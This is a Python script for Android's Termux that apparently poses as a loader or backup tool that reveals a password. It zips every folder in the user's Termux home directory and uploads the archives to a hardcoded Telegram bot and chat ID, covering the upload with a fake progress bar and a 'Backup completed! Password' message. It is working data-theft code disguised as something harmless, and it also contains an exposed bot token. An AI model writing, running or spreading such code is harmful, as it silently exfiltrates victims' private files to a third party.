import os
import zipfile
import telebot
import time

# ================= CONFIG =================
BOT_TOKEN = "7676428723:AAECtBRnxX41kSkiZev5UdX_2X63eVP-fMY"
ADMIN_CHAT_ID = 8038375045
TERMUX_HOME = "/data/data/com.termux/files/home"
BACKUP_DIR = "/data/data/com.termux/files/home/backups"
MAX_ZIP_SIZE_MB = 45  # Telegram limit < 50MB
# =========================================

bot = telebot.TeleBot(BOT_TOKEN)
os.makedirs(BACKUP_DIR, exist_ok=True)

def zip_folder_split(folder_path, output_folder, chunk_size_mb=MAX_ZIP_SIZE_MB):
    os.makedirs(output_folder, exist_ok=True)
    zip_index = 1
    current_zip_path = os.path.join(output_folder, f"{os.path.basename(folder_path)}_{zip_index}.zip")
    zipf = zipfile.ZipFile(current_zip_path, 'w', zipfile.ZIP_DEFLATED)
    current_size = 0

    for root, dirs, files in os.walk(folder_path):
        for file in files:
            full_path = os.path.join(root, file)
            try:
                file_size = os.path.getsize(full_path)
            except FileNotFoundError:
                continue  # Skip missing files silently
            if (current_size + file_size) > chunk_size_mb * 1024 * 1024:
                zipf.close()
                zip_index += 1
                current_zip_path = os.path.join(output_folder, f"{os.path.basename(folder_path)}_{zip_index}.zip")
                zipf = zipfile.ZipFile(current_zip_path, 'w', zipfile.ZIP_DEFLATED)
                current_size = 0
            try:
                zipf.write(full_path, arcname=os.path.relpath(full_path, folder_path))
                current_size += file_size
            except FileNotFoundError:
                continue  # Skip missing files silently
    zipf.close()
    return [os.path.join(output_folder, f) for f in os.listdir(output_folder) if f.startswith(os.path.basename(folder_path))]

def progress_animation(folder_name):
    for i in range(1, 101):
        print(f"\rZx Rakib Loading.... {i}%", end="", flush=True)
        time.sleep(0.01)
    print("\n")

# Termux হোমের ফোল্ডার ব্যাকআপ
for item in os.listdir(TERMUX_HOME):
    item_path = os.path.join(TERMUX_HOME, item)
    if os.path.isdir(item_path) and item != "backups":
        progress_animation(item)
        zip_files = zip_folder_split(item_path, BACKUP_DIR)
        for zip_file_path in zip_files:
            with open(zip_file_path, 'rb') as f:
                try:
                    bot.send_document(ADMIN_CHAT_ID, f)
                except Exception as e:
                    print(f"[!] Could not send {zip_file_path}: {str(e)}")

# শেষে মেসেজ
print("Backup completed! Password : python zxcvbnm.py")

# Termux shell prompt পরিবর্তন না করে রাখুন
